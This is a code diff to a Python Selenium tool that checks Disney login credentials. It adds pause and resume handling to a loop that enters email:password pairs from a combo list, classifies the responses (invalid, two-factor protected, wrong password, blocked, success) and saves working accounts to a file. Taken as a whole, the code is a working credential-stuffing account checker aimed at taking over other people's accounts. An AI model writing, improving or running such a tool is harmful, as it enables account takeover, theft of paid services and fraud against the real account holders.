@@ -31,7 +31,9 @@ class disney_checker():
 		self.browser_options.headless = True
 		self.start_checker = Button(root, text = 'Start Checker',command = self.account_checker_thread, style='GUI_Buttons.TButton')
 		self.stop_checker = False
-		
+		self.run_only_on_first_checker_instance = False
+		self.index = 0
+
 	def split_combo_file(self,root):
 	
 		self.split_combos = split_combos(root,'disney')
@@ -67,24 +69,27 @@ class disney_checker():
 		self.information_bar.destroy()
 		self.split_combos.destroy_info_label()
 		
-	def check_the_accounts(self):		
+	def check_the_accounts(self):
+		if self.run_only_on_first_checker_instance == False:
+			self.split_username_and_password()			
 		self.draw_the_infobox()
-		self.split_username_and_password()
 		self.split_combos.destroy_split_button()
 		self.split_combos.destroy_info_label()
-		index = 0
 		error_on_first_page = False
-		while index != len(self.users):
-			self.start_checker.configure(text = 'Pause', command = self.pause_resume_the_checker)
+		while self.index != len(self.users):
 			if self.stop_checker == True:
 				self.information_bar.delete('all')
 				self.information_bar.create_text(82,18,text = 'Paused..',font=('Arial',12))
-				self.stop_checker == False
-				self.start_checker.configure(text = 'Resume', command = self.check_the_accounts)
+				self.start_checker.configure(text = 'Resume', command = self.account_checker_thread)
+				self.stop_checker = False
+				self.run_only_on_first_checker_instance = True
+				print(self.stop_checker)
 				break
+			else:
+				self.start_checker.configure(text = 'Pause', command = self.pause_resume_the_checker)
 			with open('accounts/disney_working_accounts','a') as account_results:
 				try:
-					self.infobox.insert(END,'Trying Combo {} out of {}'.format(index+1, len(self.users)))
+					self.infobox.insert(END,'Trying Combo {} out of {}'.format(self.index+1, len(self.users)))
 					self.information_bar.delete('all')
 					self.information_bar.create_text(90,18,text = 'Opening Browser...',font=('Arial',12))
 					self.information_bar.update_idletasks()
@@ -94,7 +99,7 @@ class disney_checker():
 					time.sleep(9)
 					email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
 					continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
-					email_input_box.send_keys(self.users[index])
+					email_input_box.send_keys(self.users[self.index])
 					self.information_bar.delete('all')
 					self.information_bar.create_text(90,18,text ='Entering Email...',font=('Arial',12))
 					self.information_bar.update_idletasks()
@@ -106,17 +111,17 @@ class disney_checker():
 					if browser.find_elements_by_xpath('/html/body/div[3]/div/div/h4'):
 						email_error = browser.find_element_by_xpath('/html/body/div[3]/div/div/h4').text
 						if "We couldn't find an account for that email" in str(email_error):
-							self.infobox.insert(END,' | {}:{} ---> Invalid Email\n'.format(self.users[index],self.passwords[index]))
+							self.infobox.insert(END,' | {}:{} ---> Invalid Email\n'.format(self.users[self.index],self.passwords[self.index]))
 							error_on_first_page = True
 					if browser.find_elements_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3'):
 						two_factor_authentication = browser.find_element_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3').text
 						if 'Check your email inbox' in str(two_factor_authentication):
-							self.infobox.insert(END," | {}:{} ---> Protected by Two-Factor Authentication\n".format(self.users[index],self.passwords[index]))
+							self.infobox.insert(END," | {}:{} ---> Protected by Two-Factor Authentication\n".format(self.users[self.index],self.passwords[self.index]))
 							error_on_first_page = True
 					if error_on_first_page != True:
 						password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
 						login_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div/button')
-						password_input_box.send_keys(self.passwords[index])
+						password_input_box.send_keys(self.passwords[self.index])
 						self.information_bar.delete('all')
 						self.information_bar.create_text(90,18,text ='Entering Password...',font=('Arial',12))
 						self.information_bar.update_idletasks()
@@ -128,19 +133,19 @@ class disney_checker():
 						if browser.find_elements_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4'):
 							travelling_warning = browser.find_element_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4').text
 							if 'Looks like' in str(travelling_warning):
-								self.infobox.insert(END,' | {}:{} ---> Success! (Travelling)\n'.format(self.users[index],self.passwords[index]))
+								self.infobox.insert(END,' | {}:{} ---> Success! (Travelling)\n'.format(self.users[self.index],self.passwords[self.index]))
 						if browser.find_elements_by_xpath('//*[@id="password__error"]'):
 							password_or_429_error = browser.find_element_by_xpath('//*[@id="password__error"]').text
 							if 'Incorrect Password' in str(password_or_429_error):
-								self.infobox.insert(END," | {}:{} ---> Password is incorrect\n".format(self.users[index],self.passwords[index]))
+								self.infobox.insert(END," | {}:{} ---> Password is incorrect\n".format(self.users[self.index],self.passwords[self.index]))
 							if 'Due to' in str(password_or_429_error):
 								self.infobox.insert(END," | Login Blocked.\n")
 						if browser.find_elements_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2'):
 							valid = browser.find_element_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2').text
 							if "Who's watching?" in str(valid):
-								self.infobox.insert(END," | {}:{} ---> Success!\n".format(self.users[index],self.passwords[index]))
-								account_results.write('{}:{} ---> Good Account\n'.format(self.users[index],self.passwords[index]))
-					index += 1
+								self.infobox.insert(END," | {}:{} ---> Success!\n".format(self.users[self.index],self.passwords[self.index]))
+								account_results.write('{}:{} ---> Good Account\n'.format(self.users[self.index],self.passwords[self.index]))
+					self.index += 1
 					error_on_first_page = False
 					browser.close()
 				except Exception as e:
@@ -148,8 +153,7 @@ class disney_checker():
 					break
 					
 	def pause_resume_the_checker(self):
-		self.information_bar.delete('all')
-		self.information_bar.create_text(90,18,text ='Pause Queued...',font=('Arial',12))
+		self.information_bar.create_text(450,18,text ='(Pause Queued, Please Wait...)',font=('Arial',12))
 		self.stop_checker = True
 	
 	def account_checker_thread(self):
